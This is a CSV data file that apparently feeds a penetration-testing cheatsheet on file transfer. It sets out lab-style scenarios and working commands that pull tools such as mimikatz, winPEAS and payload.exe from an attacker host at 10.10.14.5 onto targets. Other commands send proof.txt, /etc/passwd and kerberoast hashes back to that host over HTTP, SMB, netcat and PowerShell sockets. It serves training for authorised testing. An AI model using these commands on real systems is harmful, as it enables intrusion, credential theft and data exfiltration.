"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"file-transfer-cheatsheet","ft-python-http-server","scenario","Scenario 1: Initial Windows Shell - Upload Enumeration Tools","","",""
"file-transfer-cheatsheet","ft-certutil-download","scenario","Scenario 1: Initial Windows Shell - Upload Enumeration Tools","","",""
"file-transfer-cheatsheet","ft-powershell-iwr","scenario","Scenario 1: Initial Windows Shell - Upload Enumeration Tools","","",""
"file-transfer-cheatsheet","ft-powershell-webclient","scenario","Scenario 1: Initial Windows Shell - Upload Enumeration Tools","","",""
"file-transfer-cheatsheet","ft-scp-upload","scenario","Scenario 2: Linux SSH Access - Transfer Exploit Binary","","",""
"file-transfer-cheatsheet","ft-python-http-server","scenario","Scenario 2: Linux SSH Access - Transfer Exploit Binary","","",""
"file-transfer-cheatsheet","ft-wget-download","scenario","Scenario 2: Linux SSH Access - Transfer Exploit Binary","","",""
"file-transfer-cheatsheet","ft-curl-download","scenario","Scenario 2: Linux SSH Access - Transfer Exploit Binary","","",""
"file-transfer-cheatsheet","ft-smb-server","scenario","Scenario 3: Windows Target - HTTP Blocked, Use SMB","","",""
"file-transfer-cheatsheet","ft-smb-download","scenario","Scenario 3: Windows Target - HTTP Blocked, Use SMB","","",""
"file-transfer-cheatsheet","ft-uploadserver","scenario","Scenario 4: Exfiltrate Proof.txt from Windows","","",""
"file-transfer-cheatsheet","ft-powershell-upload","scenario","Scenario 4: Exfiltrate Proof.txt from Windows","","",""
"file-transfer-cheatsheet","ft-smb-server","scenario","Scenario 4: Exfiltrate Proof.txt from Windows","","",""
"file-transfer-cheatsheet","ft-smb-upload","scenario","Scenario 4: Exfiltrate Proof.txt from Windows","","",""
"file-transfer-cheatsheet","ft-nc-receive","scenario","Scenario 4: Exfiltrate Proof.txt from Windows","","",""
"file-transfer-cheatsheet","ft-powershell-tcp-send","scenario","Scenario 4: Exfiltrate Proof.txt from Windows","","",""
"file-transfer-cheatsheet","ft-uploadserver","scenario","Scenario 5: Exfiltrate Database from Linux","","",""
"file-transfer-cheatsheet","ft-curl-upload","scenario","Scenario 5: Exfiltrate Database from Linux","","",""
"file-transfer-cheatsheet","ft-nc-receive","scenario","Scenario 5: Exfiltrate Database from Linux","","",""
"file-transfer-cheatsheet","ft-nc-send","scenario","Scenario 5: Exfiltrate Database from Linux","","",""
"file-transfer-cheatsheet","ft-python-http-server","scenario","Scenario 6: Restricted Shell - No wget/curl Available","","",""
"file-transfer-cheatsheet","ft-nc-receive","scenario","Scenario 6: Restricted Shell - No wget/curl Available","","",""
"file-transfer-cheatsheet","ft-bash-dev-tcp","scenario","Scenario 6: Restricted Shell - No wget/curl Available","","",""
"file-transfer-cheatsheet","ft-base64-encode","scenario","Scenario 7: Copy/Paste Exfiltration - No Network Transfer","","",""
"file-transfer-cheatsheet","ft-python-http-server","section","","Phase 1: Setup Attack Machine Servers","python3 -m http.server 8000","Serving HTTP on 0.0.0.0 port <PORT>"
"file-transfer-cheatsheet","ft-smb-server","section","","Phase 1: Setup Attack Machine Servers","impacket-smbserver share . -smb2support","Impacket v0.x.x - Copyright message"
"file-transfer-cheatsheet","ft-uploadserver","section","","Phase 1: Setup Attack Machine Servers","python3 -m uploadserver 80","File upload available at /upload"
"file-transfer-cheatsheet","ft-certutil-download","section","","Phase 2: Windows Target Downloads (Tools IN)","certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe","****  Online  ****"
"file-transfer-cheatsheet","ft-powershell-iwr","section","","Phase 2: Windows Target Downloads (Tools IN)","powershell -ep bypass -c ""Invoke-WebRequest -Uri http://10.10.14.5:8000/winPEAS.exe -OutFile C:\Temp\winPEAS.exe""","StatusCode : 200"
"file-transfer-cheatsheet","ft-powershell-webclient","section","","Phase 2: Windows Target Downloads (Tools IN)","powershell -ep bypass -c ""(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/mimikatz.exe','C:\Windows\Temp\mimikatz.exe')""","Command completes without output (silence means success)"
"file-transfer-cheatsheet","ft-smb-download","section","","Phase 2: Windows Target Downloads (Tools IN)","copy \\10.10.14.5\share\nc.exe C:\Temp\nc.exe","1 file(s) copied"
"file-transfer-cheatsheet","ft-bitsadmin-download","section","","Phase 2: Windows Target Downloads (Tools IN)","bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\Windows\Temp\payload.exe","Transfer job completed"
"file-transfer-cheatsheet","ft-wget-download","section","","Phase 3: Linux Target Downloads (Tools IN)","wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh","HTTP request sent, awaiting response... 200 OK"
"file-transfer-cheatsheet","ft-curl-download","section","","Phase 3: Linux Target Downloads (Tools IN)","curl http://10.10.14.5:8000/exploit.sh -o /tmp/exploit.sh","Progress bar reaches 100%"
"file-transfer-cheatsheet","ft-bash-dev-tcp","section","","Phase 3: Linux Target Downloads (Tools IN)","cat < /dev/tcp/10.10.14.5/4444 > /tmp/file","File created: ls -la <OUTPUT>"
"file-transfer-cheatsheet","ft-powershell-upload","section","","Phase 4: Windows Exfiltration (Data OUT)","powershell -ep bypass -c ""Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\Users\user\Desktop\proof.txt'""","StatusCode : 200"
"file-transfer-cheatsheet","ft-smb-upload","section","","Phase 4: Windows Exfiltration (Data OUT)","copy ""C:\Users\user\Desktop\data.zip"" \\10.10.14.5\share\","1 file(s) copied"
"file-transfer-cheatsheet","ft-nc-send","section","","Phase 4: Windows Exfiltration (Data OUT)","nc 10.10.14.5 4444 < /etc/passwd","Connection established (no error)"
"file-transfer-cheatsheet","ft-powershell-tcp-send","section","","Phase 4: Windows Exfiltration (Data OUT)","$client = New-Object System.Net.Sockets.TcpClient(""10.10.14.5"", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()","No error output"
